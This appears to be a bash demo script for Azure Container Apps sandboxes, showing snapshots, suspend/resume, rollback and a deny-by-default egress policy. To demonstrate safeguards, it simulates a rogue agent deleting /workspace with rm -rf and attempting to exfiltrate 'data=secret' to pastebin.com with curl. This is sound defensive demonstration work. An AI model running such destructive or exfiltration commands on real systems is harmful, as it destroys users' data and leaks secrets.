#!/usr/bin/env bash
# =============================================================================
# ACA Sandboxes Demo: "The Agent That Never Forgets"
#
# Shows 4 things dynamic sessions can't do:
#   Act 1 — Setup Once:     snapshot a warm environment, reuse across agents
#   Act 2 — Suspend/Resume: pause mid-execution, back in <1 second
#   Act 3 — Rollback:       agent wrecks workspace, restore from checkpoint
#   Act 4 — Egress Guard:   API key injected by platform, code stays clean
#
# Prerequisites:
#   - aca CLI installed  (curl -fsSL https://raw.githubusercontent.com/microsoft/azure-container-apps/main/docs/early/aca-cli/install.sh | sh)
#   - az login done
#   - aca config set with subscription / resource-group / sandbox-group / region
#   - "Container Apps SandboxGroup Data Owner" role granted to your identity
#
# Usage:
#   ./demo.sh               # guided mode  (pauses between acts, waits for Enter)
#   ./demo.sh --auto        # auto mode    (no pauses, good for recordings)
#   ./demo.sh --cleanup     # delete all demo resources created by this script
# =============================================================================

set -euo pipefail

# ── colours ──────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; DIM='\033[2m'; RESET='\033[0m'

AUTO=false
CLEANUP=false
for arg in "$@"; do
  [[ "$arg" == "--auto"    ]] && AUTO=true
  [[ "$arg" == "--cleanup" ]] && CLEANUP=true
done

# ── helpers ───────────────────────────────────────────────────────────────────
banner() {
  echo ""
  echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════╗${RESET}"
  echo -e "${CYAN}${BOLD}║  $1${RESET}"
  echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════╝${RESET}"
  echo ""
}

step() { echo -e "\n${BOLD}▶  $1${RESET}"; }
ok()   { echo -e "${GREEN}✔  $1${RESET}"; }
info() { echo -e "${DIM}   $1${RESET}"; }
warn() { echo -e "${YELLOW}⚠  $1${RESET}"; }

run() {
  # Print the command to stderr so it doesn't pollute stdout captures
  echo -e "${DIM}$ $*${RESET}" >&2
  "$@"
}

pause() {
  if [[ "$AUTO" == false ]]; then
    echo ""
    echo -e "${YELLOW}── Press Enter to continue ──────────────────────────────────────${RESET}"
    read -r
  else
    sleep 1
  fi
}

compare() {
  # compare <dynamic-sessions-pain-point> <sandboxes-win>
  echo ""
  echo -e "  ${RED}✗ Dynamic sessions: $1${RESET}"
  echo -e "  ${GREEN}✔ Sandboxes:        $2${RESET}"
  echo ""
}

# ── cleanup mode ──────────────────────────────────────────────────────────────
if [[ "$CLEANUP" == true ]]; then
  banner "Cleanup: removing demo resources"
  STATE_FILE="${TMPDIR:-/tmp}/aca-demo-state.env"
  if [[ -f "$STATE_FILE" ]]; then
    # shellcheck source=/dev/null
    source "$STATE_FILE"
    [[ -n "${SANDBOX_ID:-}" ]]    && { step "Deleting sandbox"; run aca sandbox delete --id "$SANDBOX_ID" --yes 2>/dev/null || true; }
    [[ -n "${SNAP_WARM:-}" ]]     && { step "Deleting snapshot: warm-baseline"; run aca sandboxgroup snapshot delete --name "$SNAP_WARM" 2>/dev/null || true; }
    [[ -n "${SNAP_WORK:-}" ]]     && { step "Deleting snapshot: work-checkpoint"; run aca sandboxgroup snapshot delete --name "$SNAP_WORK" 2>/dev/null || true; }
    rm -f "$STATE_FILE"
    ok "Cleanup complete"
  else
    warn "No demo state file found — nothing to clean up"
  fi
  exit 0
fi

# ── state file (survives script restarts) ────────────────────────────────────
STATE_FILE="${TMPDIR:-/tmp}/aca-demo-state.env"
SANDBOX_ID=""
SNAP_WARM="demo-warm-baseline"
SNAP_WORK="demo-work-checkpoint"

save_state() {
  cat > "$STATE_FILE" <<EOF
SANDBOX_ID=${SANDBOX_ID}
SNAP_WARM=${SNAP_WARM}
SNAP_WORK=${SNAP_WORK}
EOF
}

# ── preflight ─────────────────────────────────────────────────────────────────
banner "ACA Sandboxes Demo — The Agent That Never Forgets"

echo -e "${BOLD}This demo shows 4 things dynamic sessions can't do:${RESET}"
echo "  1. 📦 Setup Once      — snapshot a warm Python environment"
echo "  2. ⚡ Suspend/Resume  — pause the agent mid-run, back in <1 second"
echo "  3. 🔄 Rollback        — agent wrecks workspace, restore from snapshot"
echo "  4. 🔐 Egress Guard    — API key injected by platform, code is clean"
echo ""
echo -e "${DIM}Running preflight checks…${RESET}"
run aca doctor
echo ""

pause

# ─────────────────────────────────────────────────────────────────────────────
# ACT 1 — SETUP ONCE, REUSE FOREVER
# ─────────────────────────────────────────────────────────────────────────────
banner "Act 1 — 📦 Setup Once, Reuse Forever"

compare \
  "Every new session reinstalls packages from scratch (30-90s per agent)" \
  "Install once, snapshot, every agent starts warm in <1 second"

step "Create a fresh sandbox from Python 3.12"
# Capture stdout separately so pipefail can't kill the script on a bad JSON response
echo -e "${DIM}$ aca sandbox apply --file ./sandbox.yaml -o json${RESET}" >&2
_apply_out=$(aca sandbox apply --file "$(dirname "$0")/sandbox.yaml" -o json) || true
SANDBOX_ID=$(echo "$_apply_out" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])" 2>/dev/null || true)

if [[ -z "$SANDBOX_ID" ]]; then
  echo -e "${DIM}$ aca sandbox create --disk python-3.12 -o json${RESET}" >&2
  _create_out=$(aca sandbox create --disk python-3.12 -o json) || true
  SANDBOX_ID=$(echo "$_create_out" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('id', d.get('sandboxId','')))" 2>/dev/null || true)
fi

# Last resort: regex UUID out of whatever the CLI printed
if [[ -z "$SANDBOX_ID" ]]; then
  SANDBOX_ID=$(echo "${_create_out:-$_apply_out}" | grep -oE '[0-9a-f-]{36}' | head -1 || true)
fi

if [[ -z "$SANDBOX_ID" ]]; then
  echo -e "${RED}✗  Could not capture sandbox ID.${RESET}" >&2
  echo "  apply output: ${_apply_out:-<empty>}" >&2
  echo "  create output: ${_create_out:-<empty>}" >&2
  echo "  Hint: try 'aca sandbox apply --file sandbox.yaml -o json' manually to diagnose." >&2
  exit 1
fi

ok "Sandbox created: $SANDBOX_ID"
save_state

pause

step "Install the agent's Python dependencies (this is the expensive one-time cost)"
info "In a real agent pipeline this takes 30-90 seconds every cold start with dynamic sessions."
info "We do it once here, then snapshot."
run aca sandbox exec --id "$SANDBOX_ID" -c \
  "pip install --quiet pandas numpy scikit-learn matplotlib 2>&1 | tail -3 && python3 -c 'import pandas, numpy, sklearn; print(\"Dependencies ready:\", pandas.__version__, numpy.__version__)'"

pause

step "Snapshot the warm environment → agents will start from here, not from scratch"
run aca sandbox snapshot --id "$SANDBOX_ID" --name "$SNAP_WARM"
ok "Snapshot '$SNAP_WARM' saved — future agents restore in <1 second:"
info "  aca sandbox create --snapshot $SNAP_WARM"

pause

# ─────────────────────────────────────────────────────────────────────────────
# ACT 2 — SUSPEND AND RESUME WITH FULL STATE
# ─────────────────────────────────────────────────────────────────────────────
banner "Act 2 — ⚡ Suspend/Resume — The Agent Picks Up Where It Left Off"

compare \
  "Session evicted → re-install, re-clone, re-warm, re-run all prior steps" \
  "Suspend sandbox (memory snapshot) → resume in <1 second, everything intact"

step "Load data and train a model — mid-task, lots of in-memory state"
run aca sandbox exec --id "$SANDBOX_ID" -c "python3 - <<'PYEOF'
import numpy as np
from sklearn.linear_model import LinearRegression
import json, os

# Simulate a trained model the agent has built up over many steps
np.random.seed(42)
X = np.random.randn(1000, 5)
y = X @ [1.5, -2.0, 0.5, 3.0, -1.0] + np.random.randn(1000) * 0.1
model = LinearRegression().fit(X, y)

# Persist the coefficients so we can verify they survive suspend/resume
os.makedirs('/workspace', exist_ok=True)
with open('/workspace/model_state.json', 'w') as f:
    json.dump({'coef': model.coef_.tolist(), 'score': model.score(X, y)}, f)

print(f'Model trained. R²={model.score(X,y):.6f}  coef[0]={model.coef_[0]:.4f}')
print('State written to /workspace/model_state.json')
PYEOF"

pause

step "Suspend the sandbox — memory + disk preserved, compute released (zero cost)"
run aca sandbox stop --id "$SANDBOX_ID"
ok "Sandbox suspended. Compute is released — you pay nothing while idle."

pause

step "Resume the sandbox — sub-second restore"
RESUME_START=$(date +%s%N)
run aca sandbox resume --id "$SANDBOX_ID"
RESUME_END=$(date +%s%N)
RESUME_MS=$(( (RESUME_END - RESUME_START) / 1000000 ))
ok "Resumed in ${RESUME_MS}ms"

pause

step "Verify: model state is exactly where we left it"
run aca sandbox exec --id "$SANDBOX_ID" -c "python3 - <<'PYEOF'
import json
with open('/workspace/model_state.json') as f:
    state = json.load(f)
print(f'Model still in place — R²={state[\"score\"]:.6f}  coef[0]={state[\"coef\"][0]:.4f}')
print('All in-memory state survived the suspend/resume cycle.')
PYEOF"

ok "The agent picks up exactly where it left off. No re-training. No re-loading."

pause

# ─────────────────────────────────────────────────────────────────────────────
# ACT 3 — CHECKPOINT AND ROLLBACK
# ─────────────────────────────────────────────────────────────────────────────
banner "Act 3 — 🔄 Checkpoint & Rollback — Undo Agent Mistakes Instantly"

compare \
  "Agent breaks something → only option is to restart the entire session from scratch" \
  "Restore from a named snapshot in seconds — zero re-work"

step "Checkpoint the current good state before the agent attempts a risky operation"
run aca sandbox snapshot --id "$SANDBOX_ID" --name "$SNAP_WORK"
ok "Snapshot '$SNAP_WORK' saved"

pause

step "Agent goes rogue — deletes the workspace (simulating a bad tool call)"
warn "Simulating a destructive agent action…"
run aca sandbox exec --id "$SANDBOX_ID" -c \
  "rm -rf /workspace && echo 'Workspace gone.' && ls / | grep -v workspace || echo 'Confirmed: /workspace does not exist'"

pause

step "Rollback: create a new sandbox from the checkpoint"
info "In production you'd delete the rogue sandbox and restore the checkpoint."
echo -e "${DIM}$ aca sandbox create --snapshot $SNAP_WORK -o json${RESET}" >&2
_restore_out=$(aca sandbox create --snapshot "$SNAP_WORK" -o json) || true
RESTORED_ID=$(echo "$_restore_out" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('id', d.get('sandboxId','')))" 2>/dev/null || true)

if [[ -z "$RESTORED_ID" ]]; then
  RESTORED_ID=$(echo "$_restore_out" | grep -oE '[0-9a-f-]{36}' | head -1 || true)
fi

if [[ -z "$RESTORED_ID" ]]; then
  echo -e "${RED}✗  Could not capture restored sandbox ID.${RESET}" >&2
  echo "  create output: ${_restore_out:-<empty>}" >&2
  exit 1
fi

ok "Restored sandbox: $RESTORED_ID"

step "Verify: workspace and model are back"
run aca sandbox exec --id "$RESTORED_ID" -c "python3 - <<'PYEOF'
import json
with open('/workspace/model_state.json') as f:
    state = json.load(f)
print(f'Workspace restored — model R²={state[\"score\"]:.6f}')
print('The agent continues exactly from the checkpoint. Zero re-work.')
PYEOF"

ok "Rollback complete. The agent's work is safe."

step "Clean up the restored sandbox (keeping original for Act 4)"
run aca sandbox delete --id "$RESTORED_ID" --yes

pause

# ─────────────────────────────────────────────────────────────────────────────
# ACT 4 — EGRESS GUARD AND CREDENTIAL INJECTION
# ─────────────────────────────────────────────────────────────────────────────
banner "Act 4 — 🔐 Egress Guard — Credentials Never Touch the Sandbox"

compare \
  "Agent code must handle API keys — keys can be leaked or exfiltrated via tool calls" \
  "Platform injects the Authorization header — agent code is completely credential-free"

step "Apply egress policy: deny-by-default + inject OpenAI key transparently"
info "The policy is defined in egress-policy.yaml — the sandbox never sees the raw key."
run aca sandbox egress apply --id "$SANDBOX_ID" --file "$(dirname "$0")/egress-policy.yaml"
ok "Egress policy active"

pause

step "Show the policy in effect"
run aca sandbox egress show --id "$SANDBOX_ID"

pause

step "Prove deny-by-default: attempt to reach an unexpected host"
warn "Agent tries to exfiltrate data to pastebin.com…"
run aca sandbox exec --id "$SANDBOX_ID" -c \
  "curl -sf --max-time 5 https://pastebin.com/api/api_post.php -d 'data=secret' 2>&1 || echo 'BLOCKED by egress policy — exfiltration prevented'" || true

pause

step "View egress decisions — the audit trail"
run aca sandbox egress decisions --id "$SANDBOX_ID"
ok "Every outbound call is logged. Spikes in denials = misconfiguration or exfiltration attempt."

pause

# ─────────────────────────────────────────────────────────────────────────────
# SUMMARY
# ─────────────────────────────────────────────────────────────────────────────
banner "Demo Complete — What We Showed"

echo -e "  ${GREEN}✔${RESET} ${BOLD}Setup Once${RESET}     — warm Python env snapshotted; agents skip cold start entirely"
echo -e "  ${GREEN}✔${RESET} ${BOLD}Suspend/Resume${RESET} — full memory state preserved; resumed in <1 second"
echo -e "  ${GREEN}✔${RESET} ${BOLD}Rollback${RESET}        — bad agent action undone instantly from named snapshot"
echo -e "  ${GREEN}✔${RESET} ${BOLD}Egress Guard${RESET}   — deny-by-default + credential injection; code is clean"
echo ""
echo -e "${DIM}Resources still running (for further exploration):${RESET}"
echo -e "  Sandbox ID: ${SANDBOX_ID}"
echo ""
echo -e "${DIM}To clean up all demo resources:${RESET}"
echo -e "  ${CYAN}./demo.sh --cleanup${RESET}"
echo ""
